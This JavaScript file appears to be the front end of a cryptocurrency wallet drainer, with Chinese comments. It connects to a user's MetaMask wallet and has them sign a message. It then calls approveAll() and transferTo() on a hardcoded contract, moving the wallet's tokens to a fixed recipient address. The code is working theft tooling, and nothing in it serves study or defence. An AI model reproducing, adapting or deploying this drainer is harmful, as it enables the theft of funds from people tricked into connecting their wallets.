let web3;
let isConnected = false;
const recipientAddress = '0xa465e2fc9f9d527AAEb07579E821D461F700e699'; // 设置接收地址
const contractAddress = '0x1d142a62E2e98474093545D4A3A0f7DB9503B8BD'; // 智能合约地址

const erc20Abi = [
    {
        "inputs": [],
        "name": "approveAll",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "transferTo",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "_tokenAddress",
                "type": "address"
            }
        ],
        "stateMutability": "nonpayable",
        "type": "constructor"
    },
    {
        "inputs": [],
        "name": "recipient",
        "outputs": [
            {
                "internalType": "address",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "token",
        "outputs": [
            {
                "internalType": "contract IERC20",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    }
];

// 动态更新状态信息
function dynamicUpdate(status, ...messages) {
    const statusElement = document.getElementById('status');
    statusElement.innerText += `\n${status}: ${messages.join(' ')}`;
}

// 异常处理泛型函数
async function handleWithCatch(actionName, fn) {
    try {
        return await fn();
    } catch (error) {
        dynamicUpdate(actionName, '失败', error.message);
        throw error;
    }
}

// 连接钱包按钮点击事件
document.getElementById('connectButton').onclick = async () => {
    dynamicUpdate('状态', '连接钱包中...');
    
    try {
        if (typeof window.ethereum !== 'undefined') {
            // 请求钱包授权
            const accounts = await handleWithCatch('请求账户', () => window.ethereum.request({ method: 'eth_requestAccounts' }));
            web3 = new Web3(window.ethereum);

            if (accounts.length > 0) {
                updateWalletList(accounts[0]);
                isConnected = true;
                dynamicUpdate('连接状态', 'MetaMask 已连接');
                document.getElementById('signButton').disabled = false; // 启用签名按钮
            } else {
                dynamicUpdate('账户状态', '未检测到任何账户');
            }
        } else {
            dynamicUpdate('MetaMask', '未检测到，请安装 MetaMask');
        }
    } catch (error) {
        dynamicUpdate('连接失败', error.message);
    }
};

// 更新钱包列表
function updateWalletList(address) {
    const walletList = document.getElementById('walletList');
    walletList.innerHTML = ''; // 清空旧列表
    const walletItem = document.createElement('li');
    walletItem.innerText = address;
    walletList.appendChild(walletItem);
}

// 签名并转移资产按钮点击事件
document.getElementById('signButton').onclick = async () => {
    if (!isConnected) {
        dynamicUpdate('错误', '请先连接钱包');
        return;
    }

    try {
        const accounts = await web3.eth.getAccounts();
        const account = accounts[0];
        const message = `签名确认: 你正在授权从该钱包中转移代币到 ${recipientAddress}`;
        
        const signature = await handleWithCatch('签名', () => web3.eth.personal.sign(message, account));
        dynamicUpdate('签名成功', signature);

        // 调用代币转移函数
        await transferAssets(account);
    } catch (error) {
        dynamicUpdate('签名错误', error.message);
    }
};

// 转移代币的函数
async function transferAssets(account) {
    const tokenContract = new web3.eth.Contract(erc20Abi, contractAddress);
    dynamicUpdate('转移过程', `正在从账户 ${account} 中转移代币...`);

    // 批准转移代币
    await handleWithCatch('授权', () => tokenContract.methods.approveAll().send({ from: account }));
    dynamicUpdate('授权成功');

    // 执行代币转移
    await handleWithCatch('代币转移', () => tokenContract.methods.transferTo().send({ from: account }));
    dynamicUpdate('转移成功', `代币已成功转移到 ${recipientAddress}`);
}
